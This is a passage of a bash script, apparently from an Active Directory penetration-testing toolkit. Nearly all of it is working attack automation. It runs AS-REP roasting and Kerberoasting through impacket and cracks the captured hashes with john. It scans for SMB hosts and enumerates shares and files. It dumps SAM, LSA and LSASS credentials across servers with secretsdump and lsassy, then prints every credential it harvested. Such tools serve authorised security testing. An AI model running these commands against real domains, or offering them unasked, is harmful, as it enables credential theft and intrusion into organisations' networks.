            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
        else
            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user}:${password} -dc-ip ${dc_ip}
            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user}:${password} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
        fi

        if grep -q 'error' ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt; then
            echo -e "${RED}[### FAIL ###] Errors during AS REP Roasting Attack... ${NC}"
        else
            /bin/cat ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberoast/asreproast_hashes_${dc_domain}.txt 2>&1
        fi
        echo -e "${BLUE}[### END ###] AS REP Roasting Attack${NC}"
        echo -e ""
    fi
                
    if [ ! -f "${impacket_dir}/GetUserSPNs.py" ] ;  then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of impacket${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] Kerberoast Attack${NC}"
        if [ "${anon_bool}" == true ] ; then
            echo -e "${YELLOW}[### SKIP ###] Kerberoast requires credentials${NC}"
        elif [ "${hash_bool}" == true ] ; then
            /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip} -target-domain ${dc_domain}
            /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -hashes ${hash} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt
        elif [ "${kerb_bool}" == true ] ; then
            /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip} -target-domain ${dc_domain}
            /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user} -k -no-pass -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt
        else
            /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user}:${password} -dc-ip ${dc_ip} -target-domain ${dc_domain}
            /usr/bin/python3 ${impacket_dir}/GetUserSPNs.py ${domain}/${user}:${password} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt
        fi
        if [ "${anon_bool}" == false ] ; then
            if grep -q 'error' ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt; then
                echo -e "${RED}[### FAIL ###] Errors during Kerberoast Attack... ${NC}"
            else
                /bin/cat ${output_dir}/Kerberoast/kerberoast_output_${dc_domain}.txt | grep krb5tgs | sed 's/\$krb5tgs\$/:\$krb5tgs\$/' | awk -F "\$" -v OFS="\$" '{print($6,$1,$2,$3,$4,$5,$6,$7,$8)}' | sed 's/\*\$:/:/'  > ${output_dir}/Kerberoast/kerberoast_hashes_${dc_domain}.txt
                fi
        fi
        echo -e "${BLUE}[### END ###] Kerberoast Attack${NC}"
        echo -e ""
    fi

    #-------------------------------------------Cracking hashes using john the ripper
    if [ ! -f "${john}" ] ;  then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of john${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] Launching john on collected kerberoast hashes ... ${NC}"

        if [ ! -s ${output_dir}/Kerberoast/kerberoast_hashes_${dc_domain}.txt ]; then
            echo -e "${BLUE}[### END ###] john aborted, no SPN accounts found ...${NC}"
        else
            echo -e "${YELLOW}[### INFO ###] Press CTRL-C to abort john ...${NC}"
            $john ${output_dir}/Kerberoast/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --wordlist=$pass_list
            echo -e "${BLUE}[### END ###] Printing cracked Kerberoast hashes ...${NC}"
            $john ${output_dir}/Kerberoast/kerberoast_hashes_${dc_domain}.txt --format=krb5tgs --show | tee ${output_dir}/Kerberoast/kerberoast_john_results_${dc_domain}.txt
        fi

        echo -e "${BLUE}[### START ###] Launching john on collected asreproast hashes ...${NC}"

        if [ ! -s ${output_dir}/Kerberoast/asreproast_hashes_${dc_domain}.txt ]; then
            echo -e "${BLUE}[### END ###] john aborted, no accounts with Kerberos preauth disabled found ...${NC}"
        else
            echo -e "${YELLOW}[### INFO ###] Press CTRL-C to abort john ...${NC}"
            $john ${output_dir}/Kerberoast/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --wordlist=$pass_list
            echo -e "${BLUE}[### END ###] Printing cracked AS REP Roast hashes ...${NC}"
            $john ${output_dir}/Kerberoast/asreproast_hashes_${dc_domain}.txt --format=krb5asrep --show | tee ${output_dir}/Kerberoast/asreproast_john_results_${dc_domain}.txt
        fi
    fi
}

scan_servers () {
    if [ ! -f "${nmap}" ];  then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of nmap ${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] nmap scan on port 445 ${NC}"
        servers_smb_list="${output_dir}/Scans/servers_list_smb_${dc_domain}.txt"
        if [ ! -f "${servers_smb_list}" ];  then
            ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt 1>/dev/null 2>&1
            grep -a "open" ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
        else
            echo -e "${YELLOW}[### SKIP ###] SMB nmap scan results found ${NC}"
        fi
        echo -e "${BLUE}[### END ###] nmap scan on port 445 ${NC}"
    fi

    if [ ! -f "${crackmapexec}" ] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of crackmapexec${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] crackmapexec enum${NC}"

        if [ "${anon_bool}" == true ] ; then
            echo -e "${CYAN}[# Start #] spooler check ${NC}"
            ${crackmapexec} smb ${servers_smb_list} -u '' -p '' -M spooler > ${output_dir}/Scans/cme_spooler_scan_output_${dc_domain}.txt 2>&1
        elif [ "${hash_bool}" == true ] ; then
            echo -e "${CYAN}[# Start #] spooler check ${NC}"
            ${crackmapexec} smb ${servers_smb_list} -d ${domain} -u ${user} -H ${hash} -M spooler > ${output_dir}/Scans/cme_spooler_scan_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] webdav check ${NC}"
            ${crackmapexec} smb ${servers_smb_list} -d ${domain} -u ${user} -H ${hash} -M webdav > ${output_dir}/Scans/cme_webdav_scan_output_${dc_domain}.txt 2>&1
        elif [ "${kerb_bool}" == true ] ; then
            echo -e "${CYAN}[# Start #] spooler check ${NC}"
            ${crackmapexec} smb ${servers_smb_list} -d ${domain} -u ${user} -k -M spooler > ${output_dir}/Scans/cme_spooler_scan_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] webdav check ${NC}"
            ${crackmapexec} smb ${servers_smb_list} -d ${domain} -u ${user} -k -M webdav > ${output_dir}/Scans/cme_webdav_scan_output_${dc_domain}.txt 2>&1
        else
            echo -e "${CYAN}[# Start #] spooler check ${NC}"
            ${crackmapexec} smb ${servers_smb_list} -d ${domain} -u ${user} -p ${password} -M spooler > ${output_dir}/Scans/cme_spooler_scan_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] webdav check ${NC}"
            ${crackmapexec} smb ${servers_smb_list} -d ${domain} -u ${user} -p ${password} -M webdav > ${output_dir}/Scans/cme_webdav_scan_output_${dc_domain}.txt 2>&1
        fi
        echo -e "${BLUE}[### END ###] crackmapexec enum${NC}"
        echo -e ""
    fi

    if [ ! -f "${smbmap}" ];  then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of smbmap${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] 1/2 Listing accessible shares${NC}"

        for i in $(cat ${servers_smb_list}); do
            echo -e "${CYAN}[# Start #] Listing shares on ${i} ${NC}"
            if [ "${anon_bool}" == true ] ; then
                ${smbmap} -H $i -u ${user} -p "" -d ${dc_domain} | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_${i}.txt 2>&1
            elif [ "${hash_bool}" == true ] ; then
                ${smbmap} -H $i -u ${user} -p ${hash} -d ${domain} | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_${i}.txt 2>&1
            elif [ "${kerb_bool}" == true ] ; then
                echo -e "${YELLOW}[### SKIP ###] Skipping smbmap because using kerberos ticket as authentication${NC}"       
            else
                ${smbmap} -H $i -u ${user} -p ${password} -d ${domain} | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_${i}.txt 2>&1
            fi
        done

        grep -iaH READ ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print $1 ";"  $2 ";" $3}' > ${output_dir}/Scans/all_network_shares_${dc_domain}.csv
        grep -iaH READ ${output_dir}/Scans/SMBDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print "\\\\" $1 "\\" $2}' > ${output_dir}/Scans/all_network_shares_${dc_domain}.txt

        echo -e "${BLUE}[### END ###] 1/2 Listing accessible shares${NC}"
        echo -e ""

        echo -e "${BLUE}[### START ###] 2/2 Listing files in accessible shares${NC}"

        for i in $(cat ${servers_smb_list}); do
        echo -e "${CYAN}[# Start #] Listing files in accessible shares on ${i} ${NC}"
        if [ "${anon_bool}" == true ] ; then
            ${smbmap} -H $i -u ${user} -p "" -d ${dc_domain} -g -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_files_${dc_domain}_${i}.txt 2>&1
        elif [ "${hash_bool}" == true ] ; then
            ${smbmap} -H $i -u ${user} -p ${hash} -d ${domain} -g -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_files_${dc_domain}_${i}.txt 2>&1
        elif [ "${kerb_bool}" == true ] ; then
            echo -e "${YELLOW}[### SKIP ###] Skipping smbmap because using kerberos ticket as authentication${NC}"    
        else
            ${smbmap} -H $i -u ${user} -p ${password} -d ${domain} -g -R --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$' | grep -v "Working on it..." > ${output_dir}/Scans/SMBDump/smb_files_${dc_domain}_${i}.txt 2>&1
        fi
        done

        echo -e "${BLUE}[### END ###] 2/2 Listing files in accessible shares${NC}"
        echo -e ""
    fi
}

pwd_dump () { 

    if [ ! -f "${nmap}" ];  then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of nmap ${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] nmap scan on port 445 ${NC}"
        if [ -z "${servers_list}" ] ; then
            echo -e "${YELLOW}[### INFO ###] Servers list not provided, dumping passwords on all domain servers ${NC}"
            servers_smb_list="${output_dir}/Scans/servers_list_smb_${dc_domain}.txt"  
            if [ ! -f "${servers_smb_list}" ];  then
                ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt 1>/dev/null 2>&1
                grep -a "open" ${output_dir}/Scans/nmap_smb_scan_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
            else
                echo -e "${YELLOW}[### SKIP ###] SMB nmap scan results found ${NC}"
            fi
        else
            servers_ip_list="${servers_list}"
            servers_smb_list="${output_dir}/Scans/servers_custom_list_smb_${dc_domain}.txt"  
            ${nmap} -p 445 -Pn -sT -n -iL ${servers_ip_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt 1>/dev/null 2>&1
            grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
        fi
        echo -e "${BLUE}[### END ###] nmap scan on port 445 ${NC}"
    fi

    ## Dump credentials from SAM, SYSTEM and LSA secrets
    if [ ! -f "${impacket_dir}/secretsdump.py" ] ;  then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of impacket${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] Dump creds using secretsdump ${NC}"
        for i in $(cat ${servers_smb_list}); do
            echo -e "${CYAN}[# Start #] secretsdump of ${i} ${NC}"
            if [ "${anon_bool}" == true ] ; then
                echo -e "${YELLOW}[### SKIP ###] secretsdump requires credentials${NC}"
                break
            elif [ "${hash_bool}" == true ] ; then
                /usr/bin/python3 ${impacket_dir}/secretsdump.py ${domain}/${user}@${i} -hashes ${hash} > ${output_dir}/Credentials/secrets_dump_${dc_domain}_${i}.txt 2>&1
            elif [ "${kerb_bool}" == true ] ; then
                /usr/bin/python3 ${impacket_dir}/secretsdump.py -k -no-pass ${domain}/${user}@${i} > ${output_dir}/Credentials/secrets_dump_${dc_domain}_${i}.txt 2>&1
            else
                /usr/bin/python3 ${impacket_dir}/secretsdump.py ${domain}/${user}:${password}@${i} > ${output_dir}/Credentials/secrets_dump_${dc_domain}_${i}.txt 2>&1
            fi
            
            if grep -qi 'error' ${output_dir}/Credentials/secrets_dump_${dc_domain}_${i}.txt; then
                echo -e "${RED}[# Fail #] Errors detected using secretsdump on ${i} ${NC}"
            fi
        done
        echo -e "${BLUE}[### END ###] Dump creds using secretsdump ${NC}"
        echo -e ""
    fi
    
    ## Dump credentials from LSASS
    if [ "${lsassy_bool}" == true ] ; then
        if [ ! -f "${lsassy}" ] ;  then
            echo -e "${YELLOW}[### SKIP ###] Please verify the installation of lsassy${NC}"
            echo -e ""
        else
            echo -e "${BLUE}[### START ###] Dump creds using lsassy ${NC}"
            for i in $(cat ${servers_smb_list}); do
                echo -e "${CYAN}[# Start #] lsass dump of ${i} ${NC}"
                if [ "${anon_bool}" == true ] ; then
                    echo -e "${YELLOW}[### SKIP ###] lsass dump requires credentials${NC}"
                    break
                elif [ "${hash_bool}" == true ] ; then
                    ${lsassy} -d ${domain} -u ${user} -H ${hash} -o ${output_dir}/Credentials/lsass_dump_${i}.txt -K ${output_dir}/Credentials/ -f grep $i > ${output_dir}/Credentials/lsass_output_${dc_domain}_${i}.txt 2>&1
                    #${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M lsassy > ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt 2>&1
                elif [ "${kerb_bool}" == true ] ; then
                    ${lsassy} -d ${domain} -u ${user} -k -o ${output_dir}/Credentials/lsass_dump_${i}.txt -K ${output_dir}/Credentials/ -f grep $i 2>&1 > ${output_dir}/Credentials/lsass_output_${dc_domain}_${i}.txt
                    #${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -k -M lsassy > ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt 2>&1
                else
                    ${lsassy} -d ${domain} -u ${user} -p ${password} -o ${output_dir}/Credentials/lsass_dump_${i}.txt -K ${output_dir}/Credentials/ -f grep $i > ${output_dir}/Credentials/lsass_output_${dc_domain}_${i}.txt 2>&1
                    #${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p ${password} -M lsassy > ${output_dir}/Credentials/lsass_dump_${dc_domain}_${i}.txt 2>&1
                fi
                if grep -q '[x]' ${output_dir}/Credentials/lsass_output_${i}.txt; then
                    echo -e "${RED}[# Fail #] Errors detected using lsassy on ${i} ${NC}"
                fi
            done
            echo -e "${BLUE}[### END ###] Dump creds using lsassy ${NC}"
            echo -e ""
        fi
    fi

    echo -e "${YELLOW}[### INFO ###] Printing all credentials ...${NC}"

    if [ "$(/bin/ls ${output_dir}/Credentials/secrets_dump_${dc_domain}_* 2>/dev/null)" ] ; then
        grep . -aH ${output_dir}/Credentials/secrets_dump_${dc_domain}_* 2>&1 | cut -d ":" -f 1,2,3,4,5 | grep -av "\*\|aes\|des\|failed\|Impacket\|NL\$KM\|\\$:\|dpapi\|: " | sort -u | rev | cut -d "/" -f 1 | rev | sed "s/_/ /g;s/.txt:/\n/g;" | tee ${output_dir}/Credentials/all_secrets_dump_${dc_domain}.txt 2>&1
    fi

    if [ "${lsassy_bool}" == true ] ; then
        if [ "$(/bin/ls ${output_dir}/Credentials/lsass_dump_* 2>/dev/null)" ] ; then
            grep . -aH ${output_dir}/Credentials/lsass_dump_${dc_domain}_* 2>&1 | cut -d $'\t' -f 3,4,6 | sed "s/\t/:/g" | grep -v "$:" | sort -u | rev | cut -d "/" -f 1 | rev | sed "s/_/ /g;s/.txt:/\n/g;" | tee ${output_dir}/Credentials/all_lsass_dump_${dc_domain}.txt 2>&1
        fi
    fi
}

main